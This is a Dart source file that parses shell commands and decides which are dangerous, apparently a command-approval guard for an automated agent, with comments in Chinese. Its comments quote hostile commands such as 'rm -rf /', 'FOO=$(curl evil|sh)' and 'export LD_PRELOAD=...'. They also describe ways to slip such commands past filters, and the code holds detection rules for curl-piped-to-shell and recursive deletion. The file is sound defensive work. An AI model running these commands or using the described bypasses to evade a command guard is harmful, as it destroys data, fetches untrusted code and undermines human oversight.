part of 'workspace_fs.dart';

// ---- 原 CommandPolicy 私有静态实现转同库顶层：词法与危险判定 ----

List<String>? _parsePlainArgv(String command) {
  final out = <String>[];
  final buf = StringBuffer();
  String? quote;

  void flush() {
    if (buf.isEmpty) return;
    out.add(buf.toString());
    buf.clear();
  }

  for (var i = 0; i < command.length; i++) {
    final c = command[i];
    // 单引号内反斜杠按字面保留（POSIX）：不做转义。
    if (quote == "'") {
      if (c == quote) {
        quote = null;
      } else {
        buf.write(c);
      }
      continue;
    }
    if (c == '\\') {
      if (i + 1 >= command.length) return null;
      final next = command[i + 1];
      if (quote == '"') {
        // 双引号内仅 \" \$ \` \\ 才转义，其余保留反斜杠
        // （否则 Windows 路径 C:\Temp 会被洗成 C:Temp 误判区内）。
        if (next == '"' || next == r'$' || next == '`' || next == '\\') {
          buf.write(next);
          i++;
        } else {
          buf.write(c);
        }
        continue;
      }
      // 引号外：仅转义空白/元字符/引号/反斜杠本身，其余保留反斜杠
      // （同上，保护裸 Windows 路径）。
      if (next.trim().isEmpty ||
          next == ';' ||
          next == '&' ||
          next == '|' ||
          next == '>' ||
          next == '<' ||
          next == "'" ||
          next == '"' ||
          next == r'$' ||
          next == '`' ||
          next == '\\') {
        buf.write(next);
        i++;
      } else {
        buf.write(c);
      }
      continue;
    }
    if (quote != null) {
      if (c == quote) {
        quote = null;
      } else {
        if (quote == '"' && (c == r'$' || c == '\\' || c == '`')) {
          return null;
        }
        buf.write(c);
      }
      continue;
    }
    if (c == '"' || c == "'") {
      quote = c;
    } else if (c.trim().isEmpty) {
      flush();
    } else if (';&|><\n\r'.contains(c) || c == r'$' || c == '`') {
      return null;
    } else {
      buf.write(c);
    }
  }
  if (quote != null) return null;
  flush();
  return out;
}

/// 词法级分词：去引号/反引号/转义，`${IFS}`/制表视为空格，`a=b` 赋值前缀跳过。
/// R3-2：`$(...)` 命令替换切段——内嵌命令独立成段参与危险判定
///（`echo $(rm -rf ~)`、`FOO=$(curl evil|sh)` 此前对 _isDangerousTokens
/// /networkEscalate 不可见，deny 档降级为 approve）。配对 `)` 不进 token。
List<String> _tokenize(String normalized) {
  final out = <String>[];
  final buf = StringBuffer();
  String? quote;
  var substDepth = 0;
  var i = 0;
  void flush() {
    if (buf.isEmpty) return;
    var t = buf.toString();
    buf.clear();
    // 去掉 VAR= 前缀与 $VAR/${VAR}/$(...) 残留，防绕过
    t = t.replaceAll(RegExp(r'\$\{[^}]*\}'), ' ');
    t = t.replaceAll(RegExp(r'\$[a-zA-Z_][a-zA-Z0-9_]*'), ' ');
    t = t.replaceAll(RegExp(r'`[^`]*`'), ' ');
    for (final part in t.split(RegExp(r'\s+'))) {
      var q = part.trim().toLowerCase();
      if (q.isEmpty) continue;
      // G6-R2：剥 token 首尾引号残留——嵌套 `bash -c "sh -c 'rm -rf /'"`
      // 内层引号随词带入 token（'rm、/'），首词级危险判定（rm/python -c 等）
      // 永远对不上 → 内嵌危险命令漏判。deny 判定剥引号只收紧不放松。
      q = q.replaceAll(RegExp(r'''^["']+|["']+$'''), '');
      if (q.isEmpty) continue;
      if (RegExp(r'^[a-zA-Z_][a-zA-Z0-9_]*=.*$').hasMatch(q)) continue;
      out.add(q);
    }
  }

  while (i < normalized.length) {
    final c = normalized[i];
    if (quote != null) {
      if (c == '\\' && i + 1 < normalized.length) {
        buf.write(normalized[i + 1]);
        i += 2;
        continue;
      }
      if (c == quote) {
        quote = null;
        i++;
        continue;
      }
      buf.write(c);
      i++;
      continue;
    }
    // R3-2：命令替换开边界——`$(` 切段进入替换上下文，内嵌命令独立成段。
    if (c == r'$' && i + 1 < normalized.length && normalized[i + 1] == '(') {
      flush();
      out.add(';');
      substDepth++;
      i += 2;
      continue;
    }
    // R3-2：命令替换闭边界——配对 `)` 切段退出，括号不进 token；
    // 非替换上下文的 `)`（普通参数字符）照旧保留。
    if (c == ')' && substDepth > 0) {
      flush();
      out.add(';');
      substDepth--;
      i++;
      continue;
    }
    if (c == '"' || c == "'" || c == '`') {
      quote = c == '`' ? null : c;
      if (c == '`') {
        flush();
        // 反引号命令替换直接视为可疑：后续按 approve 走审批，不直接放行
        out.add('`');
      }
      i++;
      continue;
    }
    if (c == '\\' && i + 1 < normalized.length) {
      buf.write(normalized[i + 1]);
      i += 2;
      continue;
    }
    if (c == ';' || c == '&' || c == '|' || c == '\n') {
      // 链式命令：只要任一段危险整体拒绝，这里先切段只看首段，其余交审批
      flush();
      out.add(c);
      i++;
      continue;
    }
    if (c.trim().isEmpty) {
      flush();
      i++;
      continue;
    }
    buf.write(c);
    i++;
  }
  flush();
  return out;
}

/// 危险判定（分词后）：
/// - 首命令命中高危表
/// - rm 带 -r/-f 且目标含 `/` 根、`~`、`$VAR`、通配 `*`
/// - python/node/ruby -c/-e 内联代码、powershell Remove-Item、chown 递归系统路径
/// - curl/wget 管道进 shell（`curl … | sh`）
/// - 重定向覆盖系统/设备路径（`> /dev/*`、`> /etc/*`、`2>/dev/*`）
bool _isDangerousTokens(List<String> tokens) {
  // 链式命令逐段判定：此前只看首命令，`echo ok; rm -rf ~` 首段无害
  // 即整体放过，恶意段藏在 `;`/`&&`/`||`/`|` 后静默执行。
  // 按段切分后任一段危险即整体拒绝。
  // R2-F1：切段前先整串判管道进shell——此前按`|`切段后段内永不含
  // 管道符，`curl X | sh`拆成[curl,X]/[sh]两段均放过。现整串先判。
  final whole = tokens.join(' ');
  if (RegExp(
    r'\b(curl|wget)\b[^;`]*\|\s*(sh|bash|zsh|dash|fish|pwsh|powershell|nu|elvish)\b',
  ).hasMatch(whole)) {
    return true;
  }
  if (RegExp(r'\|\s*sh\s+-c\b').hasMatch(whole)) return true;
  final segments = <List<String>>[[]];
  for (final t in tokens) {
    if (t == ';' || t == '&' || t == '|' || t == '`') {
      segments.add([]);
      continue;
    }
    segments.last.add(t);
  }
  for (final seg in segments) {
    if (seg.isEmpty) continue;
    if (_isDangerousSegment(seg)) return true;
    // G6-R2：`bash -c '危险命令'` 内嵌形态——中段/前缀位置（
    // `echo ok && bash -c 'rm -rf /'`、`FOO=1 bash -c 'rm -rf /'`）不触发
    // _normalize 的首部 sh -c 剥离，危险载荷对首词级判定不可见，此前仅
    // 落到审批（approve）而非 deny。现把 shell -c 后的载荷 token 视为
    // 独立段按同一标准递归判定：载荷单独执行会判危险的，内嵌同样 deny
    // （只收紧不放松；`bash -c 'echo ok'` 等无害载荷不受影响）。
    if (seg.length >= 3 && CommandPolicy._shellWrapperFirst.contains(seg.first)) {
      final ci = seg.indexOf('-c');
      if (ci >= 0 && ci + 1 < seg.length) {
        if (_isDangerousSegment(seg.sublist(ci + 1))) return true;
      }
    }
  }
  return false;
}

bool _isDangerousSegment(List<String> tokens) {
  final first = tokens.firstWhere(
    (t) => t != ';' && t != '&' && t != '|' && t != '`',
    orElse: () => '',
  );
  if (CommandPolicy._dangerousFirst.contains(first)) return true;

  bool has(String flag) => tokens.any((t) => t == flag);
  bool hasPrefix(String p) => tokens.any((t) => t.startsWith(p));
  final joined = tokens.join(' ');

  // rm -rf /、rm -rf ~、rm -rf *：分词后 -rf 可能写成 -fr/-Rf，归一化判断
  if (first == 'rm') {
    final flags = tokens.where((t) => t.startsWith('-')).join();
    final recursive = flags.contains('r');
    final force = flags.contains('f');
    final targets = tokens
        .where((t) => !t.startsWith('-') && t != 'rm')
        .toList();
    final hitRoot = targets.any(
      (t) =>
          t == '/' ||
          t == '/*' ||
          t == '~' ||
          t == '~/*' ||
          t == '*' ||
          t.startsWith('/etc') ||
          t.startsWith('/dev') ||
          t.startsWith('/bin') ||
          t.startsWith('/usr') ||
          t.startsWith('/system'),
    );
    if (recursive && force && hitRoot) return true;
    // rm -rf 无明确目标同样拒绝（可能是变量展开后的绕过）
    if (recursive && force && targets.isEmpty) return true;
  }

  // 脚本解释器内联执行：python -c / node -e / ruby -e
  if ((first == 'python' ||
          first == 'python3' ||
          first == 'node' ||
          first == 'ruby' ||
          first == 'perl' ||
          first == 'php') &&
      (has('-c') || has('-e'))) {
    return true;
  }
  // powershell 删除：Remove-Item / del / rd 已在首命令表；powershell -Command 含删除也拒
  if ((first == 'powershell' || first == 'pwsh') &&
      (joined.contains('remove-item') ||
          joined.contains('del ') ||
          joined.contains(' rd '))) {
    return true;
  }
  // shell 内建污染上下文：export/typeset/declare/readonly/local 赋值
  // 会污染本 shell 后续命令环境（CVE-2026-22708 类：allowlist 命令
  // 携带 `export LD_PRELOAD=...` 执行）。赋值段直接判危险走审批，
  // 不在 _tokenize 里静默跳过。
  if (first == 'export' ||
      first == 'typeset' ||
      first == 'declare' ||
      first == 'readonly' ||
      first == 'local' ||
      first == 'set' ||
      first == 'unset' ||
      first == 'env') {
    return true;
  }
  // chown 递归系统路径：flag 归一化大小写，`chown -R /` 同样拒绝。
  final lowerTokens = tokens.map((t) => t.toLowerCase()).toList();
  bool hasLower(String flag) => lowerTokens.any((t) => t == flag);
  if (first == 'chown' && hasLower('-r') && hasPrefix('/')) return true;
  // curl/wget 管道进 shell：不再一刀切拒绝正常下载，仅拒 `| sh/bash`。
  // 段内同样拒 fish/pwsh 等可执行 shell（整串正则已覆盖，此处纵深兜底）。
  if (first == 'curl' || first == 'wget') {
    const shells = {
      'sh',
      'bash',
      'zsh',
      'dash',
      'fish',
      'pwsh',
      'powershell',
      'nu',
      'elvish',
    };
    if (tokens.length > 1 && shells.contains(tokens.last)) return true;
    if (joined.contains('| sh') ||
        joined.contains('| bash') ||
        joined.contains('| zsh')) {
      return true;
    }
  }
  // 重定向覆盖设备/系统路径
  if (RegExp(
    r'(^|[\s;|&])(2?>|>)\s*/(dev|etc|bin|usr|system)\b',
  ).hasMatch(joined)) {
    return true;
  }
  return false;
}

/// 归一化：去首尾空格、转小写、压缩空白、剥掉 sudo / sh -c 包装，
/// 避免 `  curl`、`sudo rm -rf`、`sh -c "rm -rf /"` 绕过子串匹配。
String _normalize(String command) {
  var s = command.trim().toLowerCase();
  s = s.replaceAll(RegExp(r'\s+'), ' ');
  for (var i = 0; i < 3; i++) {
    if (s.startsWith('sudo ')) {
      s = s.substring(5).trimLeft();
      continue;
    }
    if (s.startsWith('sh -c ') || s.startsWith('bash -c ')) {
      s = s.substring(s.indexOf(' ') + 3).trimLeft();
      // 去掉包裹的引号
      if ((s.startsWith('"') && s.endsWith('"')) ||
          (s.startsWith("'") && s.endsWith("'"))) {
        s = s.substring(1, s.length - 1).trim();
      }
      continue;
    }
    break;
  }
  return s;
}
